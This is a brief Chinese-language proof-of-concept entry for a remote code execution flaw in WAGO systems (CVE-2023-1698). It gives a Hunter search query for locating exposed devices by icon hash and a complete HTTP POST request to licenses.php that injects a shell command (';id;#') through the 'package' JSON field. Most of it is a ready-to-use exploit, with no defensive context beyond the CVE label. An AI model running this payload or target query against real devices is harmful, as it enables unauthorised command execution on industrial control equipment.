## WAGO系统远程代码执行漏洞(CVE-2023-1698)

## 鹰图 hunter
```
web.similar_icon=="10798453453671307224"
```
## poc
```
POST /wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php HTTP/1.1  
Host: 127.0.0.0  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36  
Connection: close  
Content-Length: 19  
Content-Type: application/x-www-form-urlencoded  
Accept-Encoding: gzip, deflate  
  
{"package":";id;#"}  
```
![image](https://github.com/wy876/POC/assets/139549762/4fc4fd00-bde1-4852-b6bc-b2c9a5a0256d)
